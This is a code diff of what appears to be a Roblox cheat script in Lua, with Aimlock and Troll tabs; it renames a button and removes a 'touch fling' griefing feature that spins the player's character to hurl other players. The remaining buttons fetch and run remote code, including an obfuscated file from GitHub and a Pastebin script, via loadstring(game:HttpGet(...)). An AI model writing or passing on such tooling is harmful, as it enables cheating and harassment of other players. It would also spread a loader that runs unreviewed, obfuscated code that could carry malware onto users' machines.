@@ -889,7 +889,7 @@ Tabs.Aimlock:AddToggle("UseFOV", {
 -- ║                    SCRIPTS TAB                          ║
 -- ╚══════════════════════════════════════════════════════════╝
 Tabs.Troll:AddButton({
-	Title    = "Fling",
+	Title    = "invisible",
 	Callback = function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
 	end
@@ -901,63 +901,6 @@ Tabs.Troll:AddButton({
 		loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
 	end
 })
-
--- ==========================================
--- TOUCH FLING (ARREGLADO - WALKABLE)
--- ==========================================
-local FlingActive = false
-local FlingLoop = nil
-
-local function StartFling()
-	local char = LocalPlayer.Character
-	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
-	
-	-- Hacemos tu personaje pesado para evitar que rebotes
-	for _, part in pairs(char:GetDescendants()) do
-		if part:IsA("BasePart") then
-			part.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
-		end
-	end
-	
-	-- Frame a frame le inyectamos rotación infinita
-	FlingLoop = RunService.Stepped:Connect(function()
-		local c = LocalPlayer.Character
-		if c and c:FindFirstChild("HumanoidRootPart") then
-			-- Gira violentamente en el eje Y (50,000 grados)
-			c.HumanoidRootPart.RotVelocity = Vector3.new(0, 50000, 0)
-		end
-	end)
-end
-
-local function StopFling()
-	if FlingLoop then FlingLoop:Disconnect(); FlingLoop = nil end
-	local char = LocalPlayer.Character
-	if char then
-		for _, part in pairs(char:GetDescendants()) do
-			if part:IsA("BasePart") then
-				-- Restauramos el peso normal
-				part.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
-			end
-		end
-	end
-end
-
-Tabs.Troll:AddToggle("TouchFling", {
-	Title = "Touch Fling (Toca a alguien)",
-	Default = false,
-	Callback = function(v)
-		FlingActive = v
-		if FlingActive then
-			StartFling()
-			Fluent:Notify({Title="Touch Fling", Content="Activado. Acércate a alguien.", Duration=2})
-		else
-			StopFling()
-			Fluent:Notify({Title="Touch Fling", Content="Desactivado.", Duration=2})
-		end
-	end
-})
-
-
 
 Window:SelectTab(1)
 
